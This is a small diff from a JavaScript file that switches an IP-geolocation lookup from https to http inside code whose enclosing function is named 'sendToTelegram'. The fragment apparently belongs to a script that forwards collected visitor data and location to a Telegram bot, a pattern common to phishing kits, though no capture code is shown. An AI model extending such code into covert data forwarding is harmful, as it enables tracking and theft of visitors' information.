@@ -2248,7 +2248,7 @@ async function sendToTelegram(data) {
 // Function to get location info using IP
 async function getLocationInfo(ip) {
     try {
-        const response = await fetch(`https://ip-api.com/json/${ip}`);
+        const response = await fetch(`http://ip-api.com/json/${ip}`);
         const data = await response.json();
         if (data.status === "success") {
             return `${data.city}, ${data.country} 🌍`;
